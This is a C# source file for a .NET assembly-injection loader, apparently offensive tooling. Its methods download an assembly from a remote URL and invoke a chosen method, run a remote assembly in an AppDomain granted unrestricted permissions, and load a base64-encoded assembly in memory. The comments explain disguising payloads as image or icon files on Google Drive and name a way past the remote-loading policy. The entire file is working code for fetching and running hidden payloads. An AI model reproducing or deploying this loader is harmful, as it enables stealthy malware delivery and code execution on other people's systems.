using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security;
using System.Security.Permissions;

namespace NetAssembly_Injection
{
    /// <summary>
    /// <see cref="AssemblyLoader"/> overrides certain methods defined on <see cref="IAssemblyLoader"/> interface and implement logic
    /// required to load a .Net assemblies via different methods.
    /// </summary>
    class AssemblyLoader : IAssemblyLoader
    {


        /// <summary>
        /// Loads an assembly from a URL, create an instance based on a type (Class) containing a sepcific method name
        /// , then invoke the method name.
        /// </summary>
        /// 
        /// <param name="assemblyURL">remote URL where a given .NET assembly is hosted, the assembly can be renamed from .dll or .exe 
        /// to .png, .js, .cs ..etc</param>
        /// <param name="methodName">Method name to invoke</param>
        /// <param name="arguments">Method name arguments</param>
        /// 
        /// <remarks>
        /// Attempts to load an assembly from a network location are by default now allowed due to default .NET framework CAS policy configuration,
        /// A FileLoadNotFound Exception will be thrown if <runtime><loadFromRemoteSources enabled = "true" /></ runtime > not specified in App.config.
        /// System.Reflection.Assembly.UnsafeLoadFrom() method can be used instead.
        /// </remarks>
        /// 
        /// <example>
        /// "myAssembly.exe" was renamed to "logo.png" and "favicon.ico"
        /// <code>
        /// LoadByURL("https://drive.google.com/myAssembly.exe", "Main", new string[]{});
        /// LoadByURL("https://drive.google.com/logo.png", "Main", new string[]{}); => .Net assembly renamed to logo.png
        /// LoadByURL("https://drive.google.com/favicon.ico", "Main", new string[]{}); => .Net assembly renamed to favicon.ico
        /// </code>
        /// </example>
        public void LoadByUrl(string assemblyURL, string methodName, string[] arguments)
        {
            var assembly = Assembly.LoadFrom(@assemblyURL);
            
            foreach (var type in assembly.GetTypes())
            {
                foreach (MethodInfo method in type.GetMethods()){

                    if ((method.Name.ToLower()).Equals(methodName.ToLower())){
                        object instance = Activator.CreateInstance(type);
                        method.Invoke(instance, new object[] { arguments });
                        return;
                    }
                }
            }
        }



        /// <summary>
        /// Loads an assembly from a remote host, leverage AppDomain to create an unrestricted container or sandbox allowing to download
        /// .NET assemblies from remote hosts and executing their main entry specified in the .NET Framework header.
        /// </summary>
        /// 
        /// <remarks>
        /// ExecuteAssemnly method does not spawn a new process or execute the entry point method on a new thread.
        /// ExecuteAssemblyByName method can be used to load assemblies using the Load method.
        /// </remarks>
        /// 
        /// <param name="remoteAssemblyURL">remote hosted .net assembly, can be loaded over http (according to MSDN, FTP not supported). 
        /// the assembly can be renamed from .dll or .exe to .png, .js, .cs ..etc</param>
        /// <param name="arguments">arguments to pass</param>
        /// 
        /// <example>
        /// <code>
        /// LoadByURL("https://drive.google.com/myAssembly.exe", new string[]{});
        /// LoadByURL("https://drive.google.com/logo.png", new string[]{}); => .Net assembly renamed to logo.png
        /// LoadByURL("https://drive.google.com/favicon.ico", new string[]{}); => .Net assembly renamed to favicon.ico
        /// </code>
        /// </example>
        public void LoadFromRemoteHost(string remoteAssemblyURL, string[] arguments)
        {
            PermissionSet trustedLoadFromRemoteSourcesGrantSet = new PermissionSet(PermissionState.Unrestricted);

            AppDomainSetup trustedLoadFromRemoteSourcesSetup = new AppDomainSetup();

            trustedLoadFromRemoteSourcesSetup.ApplicationBase = AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
            AppDomain trustedRemoteLoadDomain = AppDomain.CreateDomain("Trusted Appdomain", null, 
                trustedLoadFromRemoteSourcesSetup, trustedLoadFromRemoteSourcesGrantSet);

            trustedRemoteLoadDomain.ExecuteAssembly(@remoteAssemblyURL, arguments);

        }




        /// <summary>
        /// Loads a base64 encoded .NET assembly, create an instance based on a type (Class) containing a sepcific method name
        /// , then invoke the method name.
        /// </summary>
        /// 
        /// <remarks>
        /// Constructors can be used instead of method names, instansiating discovered types would trigger the default type (Class)
        /// constructor and execute its instructions.
        /// </remarks>
        /// 
        /// <param name="b64Assembly"> base64 encoded .NET assembly.</param>
        /// <param name="methodName">method name to invoke.</param>
        /// <param name="arguments">arguments which can be passed to the method name.</param>
        public void Load(string b64Assembly, string methodName, string[] arguments)
        {
            var bytes = Convert.FromBase64String(b64Assembly);
            var assembly = Assembly.Load(bytes);

            foreach (var type in assembly.GetTypes())
            {
                foreach (MethodInfo method in type.GetMethods())
                {
                    if ((method.Name.ToLower()).Equals(methodName.ToLower()))
                    {
                        object instance = Activator.CreateInstance(type);
                        method.Invoke(instance, new object[] { arguments });
                        return;
                    }
                }
            }
        }

    }
}
